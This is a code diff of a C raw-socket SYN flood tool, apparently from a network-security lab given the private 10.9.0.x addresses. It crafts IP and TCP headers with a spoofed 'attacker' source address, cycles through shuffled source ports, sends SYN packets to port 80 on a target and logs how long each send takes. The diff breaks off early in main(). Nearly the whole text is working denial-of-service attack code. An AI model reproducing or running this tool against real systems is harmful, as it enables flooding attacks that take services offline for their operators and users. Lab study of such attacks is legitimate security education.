@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -7,8 +8,11 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <sys/time.h>
+#include <time.h>
 #include <errno.h>
 #include <sys/types.h>
+
+
 
 // Constants
 #define INNER_LOOPS 10000
@@ -17,16 +21,22 @@
 #define TARGET_PORT 80
 #define ATTACKER_IP "10.9.0.2"
 #define PACKET_LEN 4096
+#define SEC_TO_MS 1000.0
+#define NSEC_TO_MS 1000000.0
+#define WINDOW_SIZE 5840
+#define PORTS 64500
+
+ int ports[PORTS];
 
 /* 
     96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
 */
-struct pseudo_header
+typedef struct pseudo_header
 {
-    u_int32_t source_address;
+    u_int32_t source_address; 
     u_int32_t dest_address;
-    u_int8_t placeholder;
-    u_int8_t protocol;
+    u_int8_t placeholder; 
+    u_int8_t protocol; 
     u_int16_t tcp_length;
 }pseudo_header;
  
@@ -48,70 +58,85 @@ unsigned short checksum(unsigned short *buf, int len) {
     return (unsigned short)~sum;
 }
 
-void setIPHeader(struct iphdr *iph, struct sockaddr_in *sin) {
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-    iph->id = htonl(rand() % 65535);
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_TCP;
+void setPorts() {
+    for (int i = 0; i < PORTS; i++) {
+        ports[i] = i+1024;
+    }
+}
+
+void shufflePorts() {
+    for (int i = 0; i < PORTS; i++) {
+        int j = rand() % PORTS;
+        int temp = ports[i];
+        ports[i] = ports[j];
+        ports[j] = temp;
+    }
+}
+
+void setIPHeader(struct iphdr *iph, struct sockaddr_in *sin) { // Function to set IP header
+    iph->ihl = 5; // IP header length
+    iph->version = 4; // IP version, IPv4
+    iph->tos = 0; // Type of service
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr); // Total length of the packet
+    iph->id = htonl(rand() % 65535); // IP ID, random number
+    iph->frag_off = 0; // Fragment offset
+    iph->ttl = 255; // Time to live, number of hops
+    iph->protocol = IPPROTO_TCP; // Protocol, TCP
     iph->saddr = inet_addr(ATTACKER_IP); // Attacker's IP
-    iph->daddr = sin->sin_addr.s_addr;
+    iph->daddr = sin->sin_addr.s_addr; // Destination IP
     iph->check = 0; // Checksum will be calculated later
 }
 
-void setTCPHeader(struct tcphdr *tcph) {
-    tcph->source = htons(rand() % 65535);
-    tcph->dest = htons(TARGET_PORT);
-    tcph->seq = 0;
-    tcph->ack_seq = 0;
+void setTCPHeader(struct tcphdr *tcph,int index) { // Function to set TCP header
+    tcph->source = htons(ports[index%PORTS]); // Source port, random number
+    tcph->dest = htons(TARGET_PORT); // Destination port
+    tcph->seq = 0;  // Sequence number
+    tcph->ack_seq = 0;  // Acknowledgement number
     tcph->doff = 5; // TCP header length
-    tcph->fin = 0;
-    tcph->syn = 1;
+    tcph->fin = 0; // FIN flag
+    tcph->syn = 1; // SYN flag - sets to 1 to establish a connection, and flood, all other flags are set to 0
     tcph->rst = 0;
     tcph->psh = 0;
     tcph->ack = 0;
     tcph->urg = 0;
-    tcph->window = htons(5840); /* maximum allowed window size */
+    tcph->window = htons(WINDOW_SIZE); // Window size
     tcph->check = 0; // Checksum will be calculated later
-    tcph->urg_ptr = 0;
+    tcph->urg_ptr = 0; // Urgent pointer
 }
 
 // Function to send a single SYN packet and log the time it took
 void send_syn_packet(int sockfd, struct sockaddr_in *target_addr, int index, FILE *log_file) {
-    char packet[PACKET_LEN];
-    memset(packet, 0, PACKET_LEN);
+    char packet[PACKET_LEN]; // Packet to be sent
+    memset(packet, 0, PACKET_LEN); // Initialize packet with 0
 
     // IP header
-    struct iphdr *iph = (struct iphdr *) packet;
+    struct iphdr *iph = (struct iphdr *) packet; //Create IP header based on packet
 
     // TCP header
-    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));
+    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr)); // Create TCP header based on packet and IP header
 
     // Set IP header
-    setIPHeader(iph, target_addr);
+    setIPHeader(iph, target_addr); 
 
     // Set TCP header
-    setTCPHeader(tcph);
+    setTCPHeader(tcph, index);
 
     // Calculate IP checksum
-    iph->check = checksum((unsigned short *) packet, iph->tot_len);
+    iph->check = checksum((unsigned short *) packet, iph->tot_len); 
 
-    // Calculate TCP checksum
-    struct pseudo_header psh;
-    psh.source_address = inet_addr(ATTACKER_IP);
-    psh.dest_address = target_addr->sin_addr.s_addr;
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(sizeof(struct tcphdr));
-    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
-    char pseudogram[psize];
-    memset(pseudogram, 0, psize);
-    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
-    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
-    tcph->check = checksum((unsigned short *) pseudogram, psize);
+    // Calculate TCP checksum, which requires a pseudo header
+    struct pseudo_header psh; // Create pseudo header
+    psh.source_address = inet_addr(ATTACKER_IP); // Attacker's IP
+    psh.dest_address = target_addr->sin_addr.s_addr; // Destination IP
+    psh.placeholder = 0; // Placeholder
+    psh.protocol = IPPROTO_TCP; // Protocol, TCP
+    psh.tcp_length = htons(sizeof(struct tcphdr)); // TCP header length
+    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr); // Size of pseudo header
+    char pseudogram[psize]; // Pseudogram to store pseudo header and TCP header
+    memset(pseudogram, 0, psize); // Initialize pseudogram with 0
+    memcpy(pseudogram, &psh, sizeof(struct pseudo_header)); // Copy pseudo header to pseudogram
+    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr)); // Copy TCP header to pseudogram
+    tcph->check = checksum((unsigned short *) pseudogram, psize); // Calculate TCP checksum
 
     // IP_HDRINCL to tell the kernel that headers are included in the packet
     int one = 1;
@@ -121,25 +146,29 @@ void send_syn_packet(int sockfd, struct sockaddr_in *target_addr, int index, FIL
     }
 
     // Send the packet and log the time it took
-    struct timeval start_time, finish_time;
-    gettimeofday(&start_time, NULL);
+    struct timespec start_time, finish_time;
+    clock_gettime(CLOCK_MONOTONIC_RAW, &start_time);
 
-    if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *) target_addr, sizeof(*target_addr)) < 0) {
+    if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *) target_addr, sizeof(*target_addr)) < 0) { //sends the packet
         perror("Send failed");
     }
 
-    gettimeofday(&finish_time, NULL);
+    clock_gettime(CLOCK_MONOTONIC_RAW, &finish_time);
 
     // Calculate time difference in milliseconds
-    float time_diff = (finish_time.tv_sec - start_time.tv_sec) * 1000.0 + (finish_time.tv_usec - start_time.tv_usec) / 1000.0;
+    float time_diff = (finish_time.tv_sec - start_time.tv_sec) * SEC_TO_MS + (finish_time.tv_nsec - start_time.tv_nsec) / NSEC_TO_MS;
 
     // Log the time difference
     fprintf(log_file, "%d %lf\n", index, time_diff);
 }
 
+
+
 int main() {
     int sockfd;
     struct sockaddr_in target_addr;
+    setPorts();
+    shufflePorts();
     FILE *log_file = fopen("syns_result_c.txt", "w");
 
     if (log_file == NULL) {
